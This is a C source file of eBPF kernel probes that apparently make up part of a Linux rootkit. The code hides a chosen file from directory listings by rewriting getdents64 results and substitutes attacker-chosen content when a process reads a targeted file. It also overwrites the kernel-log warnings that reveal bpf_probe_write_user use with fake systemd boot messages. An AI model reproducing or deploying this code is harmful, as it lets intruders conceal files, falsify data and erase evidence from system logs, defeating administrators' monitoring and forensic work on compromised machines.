#include <linux/kconfig.h>
#include <linux/ptrace.h>
#include <linux/types.h>
#include <linux/version.h>

#include "include/bpf.h"
#include "include/bpf_helpers.h"

#include "common.h"

SEC("kprobe/fill_with_zero")
int fill_with_zero(struct pt_regs *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct rk_file_t *file = (struct rk_file_t *)bpf_map_lookup_elem(&rk_files, &pid_tgid);
    if (!file)
    {
        return 0;
    }

    struct rk_fd_key_t fd_key = {
        .fd = file->fd,
        .pid = pid_tgid >> 32,
    };

    struct rk_fd_attr_t *fd_attr = (struct rk_fd_attr_t *)bpf_map_lookup_elem(&rk_fd_attrs, &fd_key);
    if (!fd_attr)
    {
        return 0;
    }

    const char c = '\0';

#pragma unroll
    for (int i = 0; i != 256; i++)
    {
        if (i == fd_attr->read_size - 1)
        {
            break;
        }
        bpf_probe_write_user(fd_attr->read_buf + i, &c, 1);
    }

    return 0;
}

SEC("kprobe/kmsg")
int kmsg(struct pt_regs *ctx)
{
    int retval = PT_REGS_RC(ctx);

    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct rk_file_t *file = (struct rk_file_t *)bpf_map_lookup_elem(&rk_files, &pid_tgid);
    if (!file)
    {
        return 0;
    }

    struct rk_fd_key_t fd_key = {
        .fd = file->fd,
        .pid = pid_tgid >> 32,
    };

    struct rk_fd_attr_t *fd_attr = (struct rk_fd_attr_t *)bpf_map_lookup_elem(&rk_fd_attrs, &fd_key);
    if (!fd_attr || !fd_attr->read_buf)
    {
        return 0;
    }

    char buf[128];
    bpf_probe_read(buf, sizeof(buf), fd_attr->read_buf);

    u8 o1 = 0;
    u64 hash = 0;

#pragma unroll
    for (int i = 0; i != 128; i++)
    {
        if (buf[i] == ';' && !o1)
        {
            hash = FNV_BASIS;
            o1 = i + 1;
            continue;
        }
        else if (buf[i] == ' ')
        {
            hash = FNV_BASIS;
            continue;
        }
        update_hash_byte(&hash, buf[i]);

        // `bpf_probe_write_user` hash or `bpf_get_probe_write_proto`
        if (hash == 0xada8e5f3e94cf1f8 || hash == 0x55c7edee212d1ef4)
        {
            break;
        }
    }

    if (hash == 0xada8e5f3e94cf1f8)
    {
        const char override[] = "systemd[1]: Reached target Sockets.";
        bpf_probe_write_user(fd_attr->read_buf + o1, override, sizeof(override) - 1);

        fd_attr->read_buf += o1 + sizeof(override) - 1;
        fd_attr->read_size = retval - (o1 + sizeof(override) - 1);

        bpf_tail_call(ctx, &rk_progs, FILL_WITH_ZERO_PROG);
    }

    if (hash == 0x55c7edee212d1ef4)
    {
        const char override[] = "systemd[1]: Reached target Paths.";
        bpf_probe_write_user(fd_attr->read_buf + o1, override, sizeof(override) - 1);

        fd_attr->read_buf += o1 + sizeof(override) - 1;
        fd_attr->read_size = retval - (o1 + sizeof(override) - 1);

        bpf_tail_call(ctx, &rk_progs, FILL_WITH_ZERO_PROG);
    }

    return 0;
}

SEC("kprobe/override_content")
int override_content(struct pt_regs *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct rk_file_t *file = (struct rk_file_t *)bpf_map_lookup_elem(&rk_files, &pid_tgid);
    if (!file)
    {
        return 0;
    }

    struct rk_fd_key_t fd_key = {
        .fd = file->fd,
        .pid = pid_tgid >> 32,
    };

    struct rk_fd_attr_t *fd_attr = (struct rk_fd_attr_t *)bpf_map_lookup_elem(&rk_fd_attrs, &fd_key);
    if (!fd_attr || !fd_attr->read_buf)
    {
        return 0;
    }

    struct rk_fd_content_key_t fd_content_key = {
        .id = fd_attr->action.override_id,
        .chunk = fd_attr->override_chunk,
    };

    struct rk_fd_content_t *fd_content = (struct rk_fd_content_t *)bpf_map_lookup_elem(&rk_fd_contents, &fd_content_key);
    if (!fd_content)
    {
        return 0;
    }

    int i = 0;

#pragma unroll
    for (i = 0; i != sizeof(fd_content->content); i++)
    {
        if (i == fd_content->size)
        {
            break;
        }

        bpf_probe_write_user(fd_attr->read_buf + i, &fd_content->content[i], 1);
    }

    return 0;
}

SEC("kprobe/override_getdents")
int override_getdents(struct pt_regs *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct rk_getdents_t *getdents = (struct rk_getdents_t *)bpf_map_lookup_elem(&rk_getdents, &pid_tgid);
    if (!getdents)
    {
        return 0;
    }

    int size = (unsigned int)PT_REGS_RC(ctx);

    char name[256] = {};
    u64 hash;

#pragma unroll
    for (int i = 0; i != 200; i++)
    {
        if (getdents->read <= size)
        {
            bpf_probe_read_str(name, sizeof(name), (void *)getdents->dirent->d_name);

            hash = FNV_BASIS;
            update_hash_str(&hash, name);

            if (hash == getdents->hidden_hash)
            {
                getdents->overridden = 1;
            }
            if (getdents->overridden)
            {
                struct linux_dirent64 next;
                bpf_probe_read(&next, sizeof(next), (void *)(getdents->dirent + 1));

                bpf_probe_write_user((void *)getdents->dirent, (void *)&next, sizeof(struct linux_dirent64));
            }

            getdents->read += sizeof(struct linux_dirent64);
            getdents->dirent++;
        }
    }

    bpf_tail_call(ctx, &rk_progs, OVERRIDE_GET_DENTS);

    return 0;
}

SEC("kretprobe/__x64_sys_getdents64")
int __x64_sys_getdents64_ret(struct pt_regs *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct rk_getdents_t *getdents = (struct rk_getdents_t *)bpf_map_lookup_elem(&rk_getdents, &pid_tgid);
    if (!getdents)
    {
        return 0;
    }

    if (getdents->overridden)
    {
        int size = (int)PT_REGS_RC(ctx);
        bpf_override_return(ctx, size - sizeof(struct linux_dirent64));
    }

    return 0;
}

char _license[] SEC("license") = "GPL";
__u32 _version SEC("version") = 0xFFFFFFFE;
